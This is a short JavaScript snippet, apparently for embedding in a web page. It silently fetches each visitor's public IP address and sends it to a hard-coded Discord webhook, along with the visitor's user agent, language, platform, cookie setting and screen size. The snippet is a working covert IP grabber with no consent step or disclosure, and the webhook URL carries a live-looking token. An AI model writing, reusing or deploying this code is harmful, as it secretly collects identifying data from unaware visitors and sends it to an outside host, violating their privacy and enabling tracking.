fetch('https://api.ipify.org')
.then(response => response.text())
.then(ip => {
    fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            embeds: [{
                title: "VISITOR INFO",
                description: "IP: " + ip + "\nUser Agent: " + navigator.userAgent + "\nLanguage: " + navigator.language + "\nPlatform: " + navigator.platform + "\nCookies: " + navigator.cookieEnabled + "\nScreen: " + screen.width + 'x' + screen.height,
                color: 0xff00
            }]
        })
    });
});
